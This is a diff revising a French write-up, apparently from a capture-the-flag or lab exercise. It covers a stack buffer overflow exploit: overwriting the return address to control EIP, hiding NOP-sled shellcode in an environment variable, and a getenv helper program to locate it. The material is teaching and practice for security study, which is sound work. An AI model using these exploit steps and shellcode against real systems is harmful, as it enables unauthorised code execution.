@@ -100,13 +100,15 @@ adresses croissantes →
 
 62 bytes écrits → on écrase EIP. ✓
 
-> **Le but de tout l'exploit : contrôler EIP.**
-> EIP est le registre qui contient l'**adresse de la prochaine instruction à
-> exécuter** — le « doigt » que le CPU suit dans le code. Quand une fonction se
-> termine (`ret`), le CPU charge dans EIP l'**adresse de retour** stockée sur la
-> pile. En débordant `result`, on écrase justement cette adresse de retour :
-> au `ret`, le CPU saute donc là où **nous** voulons (notre shellcode) au lieu
-> de revenir dans `main`. Maîtriser EIP = maîtriser ce que la machine exécute.
+> **Le but : contrôler ce que le CPU exécute ensuite.**
+> Concrètement, **on écrase l'adresse de retour** stockée sur la pile (juste
+> après `result` + le saved EBP). Au `ret`, le CPU recopie cette adresse dans
+> **EIP** — le registre qui pointe la prochaine instruction à exécuter. Comme
+> on a remplacé l'adresse de retour par celle de notre shellcode, le `ret` fait
+> sauter le CPU sur **notre** code au lieu de revenir dans `main`. On ne touche
+> jamais EIP directement : on pirate l'adresse de retour, et `ret` fait le
+> transfert. (En jargon sécu on dit « contrôler EIP » : c'est le même objectif,
+> exprimé par sa conséquence.)
 
 ---
 
@@ -140,7 +142,7 @@ C'est donc là qu'on placera l'adresse de retour : `'A'*9 + <adresse> + 'A'*7` (
 
 ## Exploit — shellcode en variable d'environnement
 
-NX étant désactivé, on peut exécuter du code directement sur la stack.
+NX (no-execute)étant désactivé, on peut exécuter du code directement sur la stack.
 On place le shellcode dans une variable d'environnement avec un NOP sled pour
 ne pas avoir à viser exactement le premier byte.
 
@@ -167,21 +169,30 @@ export SHELLCODE=$(python -c "print '\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x
 
 ### Étape 2 — Trouver l'adresse de la variable d'env
 
-```c
-// /tmp/getenv.c
+On écrit un mini-programme qui affiche l'adresse mémoire de `SHELLCODE`
+(`getenv` la renvoie), on le compile, puis on le lance.
+
+```bash
+# 1. créer le fichier source
+cat > /tmp/getenv.c << 'EOF'
 #include <stdio.h>
 #include <stdlib.h>
 int main() {
     printf("%p\n", getenv("SHELLCODE"));
     return 0;
 }
+EOF
+
+# 2. compiler
+gcc /tmp/getenv.c -o /tmp/getenv
+
+# 3. lancer → affiche l'adresse
+/tmp/getenv
+# → 0xbffff8a3   (EXEMPLE : chez toi ce sera une AUTRE valeur, prends la tienne)
 ```
 
-```bash
-gcc /tmp/getenv.c -o /tmp/getenv
-/tmp/getenv
-# → 0xbffff8a3
-```
+> ⚠️ L'adresse `0xbffff8a3` n'est qu'un exemple. Utilise la valeur que **ton**
+> `/tmp/getenv` affiche, et écris-la en little-endian dans l'étape suivante.
 
 ### Étape 3 — Construire l'input
 
